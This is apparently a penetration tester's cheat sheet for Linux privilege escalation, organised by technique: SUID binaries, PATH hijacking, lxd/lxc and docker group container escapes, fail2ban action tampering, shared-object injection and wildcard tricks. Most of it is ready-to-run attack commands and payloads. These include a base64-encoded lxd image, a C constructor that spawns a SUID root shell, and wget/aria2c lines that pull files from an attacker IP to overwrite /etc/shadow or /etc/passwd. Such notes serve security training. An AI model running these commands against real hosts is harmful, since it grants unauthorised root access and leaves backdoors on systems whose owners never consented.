# SUID / groups / privesc

{% embed url="https://nozerobit.github.io/linux-privesc-groups/#video-group" %}

{% embed url="https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/openssl-privilege-escalation/" %}
CHECK LEFT MENU FOR EXAMPLES
{% endembed %}

{% hint style="info" %}
When checking with ltrace, take into account this binary drops SUID permission. Don't get confused with that.
{% endhint %}

```bash
SetUID, to check eUID of a process (passwd for example)
ps u -C passwd
grep Uid /proc/$PID/status # real UID and then effective UID
```

## Find binaries

```bash
find \-perm -4000 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null
# FIND SUID FILES THAT WERE MODIFIED
find / -perm -u=s 2>/dev/null | xargs stat
# Then list the ones with more recent access

# THEN CHECK THEM ON GTFOBINS, MAYBE THERE IS ONE NOT FOUND BY LINPEAS
# *****COMPARE SUID LIST ON KALI WITH THE TARGET'S TO FIND ODDS BINARIES
```

## Abusing shell features

{% code overflow="wrap" %}
```bash
# Imagine with strings we see an SUID file that calls /usr/bin/service or any service
/usr/sbin/service apache2 start

# Verify Bash version is < 4.2-048 otherwise this technique should not work
/bin/bash --version
# Create a Bash function with the name of the service
function /usr/sbin/service { /bin/bash -p; }
# Export the function
export -f /usr/sbin/service
# Now run the SUID executable to spawn a root shell!

# ------------------------------METHOD 2
# Note: This will not work on Bash versions 4.4 and above.
# When in debugging mode, Bash uses the environment variable 
# PS4 to display an extra prompt for debugging statements.
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
# Run /tmp/rootbash executable with -p to gain a shell with root privileges:
/tmp/rootbash -p
```
{% endcode %}

## PATH Hijacking

{% hint style="warning" %}
Before trying this method, check if the file that executes a command is writable (easier way to go).
{% endhint %}

1. What folders are located under $PATH
2. Does your current user have write privileges for any of these folders?
3. Can you modify $PATH?
4. Is there a script/application you can start that will be affected by this vulnerability?
5. If there is a command _**`ls`**_ for example with SUID and a relative path.
6. Or with _**`strings`**_ we see a binary executed inside SUID with a relative path.

{% code overflow="wrap" %}
```bash
echo "chmod 4755 /bin/bash" > /tmp/ls # SOMETIMES /bin/bash -p IS NECESSARY to trigger it
chmod +x /tmp/ls

# Now, we need to change the PATH variable, so that it points to the directory where we have our imitation "ls" stored! 
export PATH=/tmp:$PATH

# Note, this will cause you to open a bash prompt every time you use "ls". 
# If you need to use "ls" before you finish the exploit, use "/bin/ls" where the real "ls" executable is.

#Once you've finished the exploit, you can exit out of root and use 
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:$PATH
# to reset the PATH variable back to default, letting you use "ls" again!
```
{% endcode %}

## SETENV

`SETENV` preserves the environment when calling the script

Perl env variables

```
sudo PERL5OPT=-d PERL5DB='system("touch /file")' binary
```

curl, env variables [https://curl.se/docs/manpage.html](https://curl.se/docs/manpage.html)

LD\_PRELOAD [https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld\_preload-and-ld\_library\_path](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld_preload-and-ld_library_path)

## wget

```bash
sudo /usr/bin/wget http://10.10.10.10/shadow -O /etc/shadow
# WE CAN OVERWRITE SHADOW TO GET ROOT
```

## more / less

We can exploit them if they run with **sudo** or **SUID**. Make the screen small while more mode and then we can input commands:

```bash
First we type v #--> to enter into command mode
Then shift+:   #---> to input commands
:set shell=/bin/bash #--> to get a bash shell
:shell
```

## apt / apt-get

[https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/](https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/)

## cp (wildcard)

```bash
james@blaze:~$ cp /bin/bash .
james@blaze:~$ chmod 4777 bash 
james@blaze:~$ touch -- --preserve=mode
```

## snap

{% embed url="https://shenaniganslabs.io/2019/02/13/Dirty-Sock.html" %}

## **dosbox**

Can read/write privileged files. Try to combine it with VNC or any other graphical interface to modify files easily.

Can give all permissions to a user by adding a line to sudoers file

```bash
-c 'echo xxx > c:\tmp\...' or -c 'echo xxx >>c:\xxx'
```

## npm

Follow GTFOBins but important,

```
chmod 777 $TF
```

to not receive permission denied.

## **lxd / lxc group**

{% tabs %}
{% tab title="Overview" %}
[**https://www.hackingarticles.in/lxd-privilege-escalation/**](https://www.hackingarticles.in/lxd-privilege-escalation/)

[https://github.com/carlospolop/hacktricks/blob/master/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation.md](https://github.com/carlospolop/hacktricks/blob/master/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation.md)

Among the more curious privilege escalation methods on Linux, lxd is certainly a mind-bender, to say the least. This technique involves leveraging a flaw in lxd, a program that we can use to spin up containers much akin to Docker.&#x20;

This exploit specifically involves abusing mount points to mount volumes from our victim machine (the machine we're attacking) within a container that we shouldn't be able to access/read. However, we have root powers on lxd containers - thus allowing us to bypass the read permission checks and escalate our privileges.&#x20;
{% endtab %}

{% tab title="Explanation" %}
We can perform this privesc method via the following steps:

1\. First, we need to check and see if our user is a member of the lxd group. We can do this with the command: id

![](<../../.gitbook/assets/image (63).png>)

2\. Typically, this privesc can be a bit of a drawn-out process, however, in our case, we'll be able to skip part of the way through. To perform it properly, we have to perform the following steps.:

**- Steps to be performed on the attacking machine:**

\- - Download build-alpine on your local machine via the git repository

\- - Execute the script "build -alpine" that will build the latest Alpine image as a compressed file. This must be executed by the root user.

**- Steps to be performed on the victim machine:**

\- - Transfer the alpine image to the victim machine (by using python server or SCP)

\- - Import image for lxd (first locate lxc if it's not in /snap/bin/lxc) -->&#x20;

\- - Initialize the image inside a new container <- Worth checking the already imported/available images as you may be able to skip to this step

\- - Mount the container inside the /root directory

3\. For the sake of this example, we'll be skipping close to the end (see the bolded bit above) by checking what images are readily available on the machine in question. We can do that via the following command: lxc image list

![](<../../.gitbook/assets/image (90).png>)

Checking what images are available via the command: lxc image list

4\. Now for the fun bit. Next, we'll run a series of commands which initialize, configure the disks, and start the container. Image name needs to match up with the imported image we'll be using. In the case of the image above, that'd be the myimage alias previously assigned to it. The container name and device name are whatever your heart desires. In my example, I'm naming my container strongbad and the device trogdor.

`lxc init IMAGENAME CONTAINERNAME -c security.privileged=true`

Ex: lxc init myimage strongbad -c security.privileged=true

`lxc config device add CONTAINERNAME DEVICENAME disk source=/ path=/mnt/root recursive=true`

Ex: lxc config device add strongbad trogdor disk source=/ path=/mnt/root recursive=true

`lxc start CONTAINERNAME`

Ex: lxc start strongbad

`lxc exec CONTAINERNAME /bin/sh`

Ex: lxc exec strongbad /bin/sh

We'll then run just a few more commands to mount our storage and verify we've escalated to root:

`id`

`cd /mnt/root/root`
{% endtab %}

{% tab title="Short way" %}
[https://blog.m0noc.com/2018/10/lxc-container-privilege-escalation-in.html?m=1](https://blog.m0noc.com/2018/10/lxc-container-privilege-escalation-in.html?m=1)

{% code overflow="wrap" %}
```shell
# Use minimal image in base64 on the target
$ echo QlpoOTFBWSZTWaxzK54ABPR/p86QAEBoA//QAA3voP/v3+AACAAEgACQAIAIQAK8KAKCGURPUPJGRp6gNAAAAGgeoA5gE0wCZDAAEwTAAADmATTAJkMAATBMAAAEiIIEp5CepmQmSNNqeoafqZTxQ00HtU9EC9/dr7/586W+tl+zW5or5/vSkzToXUxptsDiZIE17U20gexCSAp1Z9b9+MnY7TS1KUmZjspN0MQ23dsPcIFWwEtQMbTa3JGLHE0olggWQgXSgTSQoSEHl4PZ7N0+FtnTigWSAWkA+WPkw40ggZVvYfaxI3IgBhip9pfFZV5Lm4lCBExydrO+DGwFGsZbYRdsmZxwDUTdlla0y27s5Euzp+Ec4hAt+2AQL58OHZEcPFHieKvHnfyU/EEC07m9ka56FyQh/LsrzVNsIkYLvayQzNAnigX0venhCMc9XRpFEVYJ0wRpKrjabiC9ZAiXaHObAY6oBiFdpBlggUJVMLNKLRQpDoGDIwfle01yQqWxwrKE5aMWOglhlUQQUit6VogV2cD01i0xysiYbzerOUWyrpCAvE41pCFYVoRPj/B28wSZUy/TaUHYx9GkfEYg9mcAilQ+nPCBfgZ5fl3GuPmfUOB3sbFm6/bRA0nXChku7aaN+AueYzqhKOKiBPjLlAAvxBAjAmSJWD5AqhLv/fWja66s7omu/ZTHcC24QJ83NrM67KACLACNUcnJjTTHCCDUIUJtOtN+7rQL+kCm4+U9Wj19YXFhxaXVt6Ph1ALRKOV9Xb7Sm68oF7nhyvegWjELKFH3XiWstVNGgTQTWoCjDnpXh9+/JXxIg4i8mvNobXGIXbmrGeOvXE8pou6wdqSD/F3JFOFCQrHMrng= | base64 -d > bob.tar.bz2
$ lxd init # accepts all defaults except IPv6 option, type "none" there
$ lxc image import bob.tar.bz2 --alias bobImage # import the image
$ lxc init bobImage bobVM -c security.privileged=true # create the image
$ lxc config device add bobVM realRoot disk source=/ path=r # add it to the host filesystem
$ lxc start bobVM # start the image
$ lxc exec bobVM -- /bin/sh # get a shell and access the filesystem

# After creating a root container and execute it, I could assign SUID binary to bash for example to achieve privesc
# id
uid=0(root) gid=0(root) groups=0(root)
# ls -l /r/bin/bash
-rwxr-xr-x 1 root root 1113504 Apr 18  2022 /r/bin/bash
# cp /r/bin/bash /r/tmp/rootbash
# chmod 4755 /r/tmp/rootbash
# exit
user@target:/tmp$ ls -l rootbash 
-rwsr-xr-x 1 root root 1113504 Mar 31 14:24 rootbash
```
{% endcode %}
{% endtab %}

{% tab title="Long option" %}
If you belong to _**lxd**_ **or** _**lxc**_ **group**, you can become root.

Build an Alpine image and start it using the flag `security.privileged=true`, forcing the container to interact as root with the host filesystem.

{% code overflow="wrap" %}
```bash
# build a simple alpine image
git clone https://github.com/saghul/lxd-alpine-builder
./build-alpine -a i686

# If you got error
ERROR: unsatisfiable constraints:
  alpine-base (missing):
    required by: world[alpine-base]
Failed to install rootfs

# Maybe the error is due to mirror sites but it will create a rootfs directory in same folder i.e "lxd-alpine-builder" .
1.) Edit the file rootfs/usr/share/alpine-mirrors/Mirrors.txt deleting all the entries but the first one, do the same with mirrors.yaml.
2.) Again run - sudo ./build-alpine -a i686


# import the image
lxc image import ./alpine.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.

# before running the image, start and configure the lxd storage pool as default 
lxd init

# run the image
lxc init myimage mycontainer -c security.privileged=true

# mount the /root into the image
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true

# interact with the container
lxc start mycontainer
lxc exec mycontainer /bin/sh
```
{% endcode %}
{% endtab %}

{% tab title="Exploit-DB" %}
[https://www.exploit-db.com/exploits/46978](https://www.exploit-db.com/exploits/46978)
{% endtab %}
{% endtabs %}

## docker group

{% code overflow="wrap" %}
```bash
https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#docker-group
docker image # Get images from the docker service

# Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
```
{% endcode %}

## fail2ban group

Check _/etc/fail2ban/jail.conf_ file to see bantime and banaction file for SSH or other services.\
Modify the following file with our command (in this case, bash SUID binary)

```bash
https://grumpygeekwrites.wordpress.com/2021/01/29/privilege-escalation-via-fail2ban/

user@hostname:/etc/fail2ban/action.d$ cat iptables-multiport.conf
# Fail2Ban configuration file
#
# Author: Cyril Jaquier
# Modified by Yaroslav Halchenko for multiport banning
#
<SNIP>
# Option:  actionban
# Notes.:  command executed when banning an IP. Take care that the
#          command is executed with Fail2Ban user rights.
# Tags:    See jail.conf(5) man page
# Values:  CMD
#
actionban = <iptables> -I f2b-<name> 1 -s <ip> -j <blocktype>
            chmod 4755 /bin/bash

# Option:  actionunban
# Notes.:  command executed when unbanning an IP. Take care that the
#          command is executed with Fail2Ban user rights.
# Tags:    See jail.conf(5) man page
# Values:  CMD
#
actionunban = <iptables> -D f2b-<name> -s <ip> -j <blocktype>
              chmod 4755 /bin/bash
```

Then try some fail SSH login attempts and the command will be executed successfully.

## Wildcards

```
https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks

command /path/to/file/* parameter
# We could add new parameters of that command -> check man/help
command /path/to/file/* -e 'bash' parameter
command /path/to/file/* --chown root:root parameter
```

### tar privilege escalation (cronjob)

[https://blog.gregscharf.com/2021/03/22/tar-in-cronjob-to-privilege-escalation/](https://blog.gregscharf.com/2021/03/22/tar-in-cronjob-to-privilege-escalation/)

## Shared Object Injection

```sh
- Search for all SUIDs, then analyze each SUID
strace $SUID 2>&1 | grep -i -E "open|access|no such file"
- Check if there is a .so file missing from a writable directory
- Write a file as $MISSING_FILE.c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
# Then compile it
gcc -shared -o /$PATH/$MISSING_FILE.so -fPIC /$PATH/$MISSING_FILE.c
# Finally run the SUID
/usr/bin/suid
```

## aria2c

{% code overflow="wrap" %}
```bash
https://aria2.github.io/manual/en/html/aria2c.html#cmdoption-allow-overwrite
/usr/bin/aria2c -i <any file> # I can read any file as root if SUID has root user
#Copy passwd content to our attacking machine, add a new root user and then overwrite passwd
user@target:/etc$ aria2c http://192.168.0.0:8000/passwd --allow-overwrite=true -o /etc/passwd

# CHECK other parameters such as --continue
```
{% endcode %}

## mlocate group

This group can read **mlocate.db** file.

This file contains indexed files/folders, even the ones we do not have access to read/go through.

```bash
find / -type f -group mlocate 2>/dev/null
# To read file/folders
strings mlocate.db
# keyword might be root, $USER or any file/folder and its structure we want to list
strings mlocate.db | grep -i $KEYWORD -C 10
```

## Perl environment variables

[https://www.elttam.com/blog/env/](https://www.elttam.com/blog/env/)

## Symlinks

<pre class="language-bash"><code class="lang-bash">$ sysctl fs.protected_symlinks
fs.protected_symlinks = 1
<strong># This means:    symlinks are permitted to be followed only when outside a sticky world-writable directory, or when the uid of the symlink and follower match, or when the directory owner matches the symlink’s owner.
</strong># I need to avoid putting symlinks that I want to follow (like b above) in /tmp, /var/tmp, or /dev/shm, etc:


1. In command prompt type: dpkg -l | grep nginx
2. From the output, notice that the installed nginx version is below 1.6.2-5+deb8u3
https://github.com/xkon/vulBox/blob/master/CVE-2016-1247/cve-2016-1247-poc.sh
</code></pre>

## Chrome Remote Debugging Port

[https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/chrome-remote-debugger-pentesting/](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/chrome-remote-debugger-pentesting/)

## Borg

Checking **borg mount** docu [https://borgbackup.readthedocs.io/en/stable/usage/mount.html](https://borgbackup.readthedocs.io/en/stable/usage/mount.html)

It says I can override the permissions and check mount options on the mount.fuse(8) manual page [https://manpages.debian.org/testing/fuse/mount.fuse.8.en.html](https://manpages.debian.org/testing/fuse/mount.fuse.8.en.html).&#x20;

There I see an option **allow\_other** to allow others file access. I have to use it in conjuntion with **uid** and **gid** as the borg docu mentions _"The uid and gid mount options (implemented by Borg) can be used to override the user and group ids of all files (i.e., borg mount -o uid=1000,gid=1000)."_

## wheel / adm group

**wheel** group is like being root. Try sudo or doas to escalate privileges.

**adm** usually has the ability to read logs (SSH logs, Apache logs, mail logs and so on) so it is important to find sensitive data.

Find files by **wheel** / **adm** users or the users in the home directory. If the user is member of other groups (such as audio, video, **disk**), it might be a good idea to check for files owned by particular groups.

## mosh

[https://linux.die.net/man/1/mosh-client](https://linux.die.net/man/1/mosh-client)[\
](https://linux.die.net/man/1/mosh-clienthttps://linux.die.net/man/1/mosh-server)[https://linux.die.net/man/1/mosh-server](https://linux.die.net/man/1/mosh-server)

## disk group

[https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#disk-group](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#disk-group)

{% embed url="https://bitvijays.github.io/LFC-VulnerableMachines.html#disk" %}
